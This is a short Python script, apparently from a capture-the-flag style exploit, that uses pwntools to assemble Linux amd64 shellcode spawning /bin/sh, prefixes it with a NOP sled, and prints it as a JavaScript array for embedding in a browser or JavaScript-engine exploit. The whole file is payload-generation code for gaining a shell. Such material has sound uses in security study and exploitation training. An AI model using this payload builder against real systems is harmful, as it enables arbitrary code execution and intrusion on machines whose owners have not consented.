from pwn import *

context.arch = "amd64"

shellcode = asm(shellcraft.amd64.linux.sh())
shellcode = b"\x90" * 0x30 + shellcode
# f = open("pay.bin", "rb").read()

print("var shellcode = [", end="")
for x in shellcode:
    print(x, end=",")
print("];")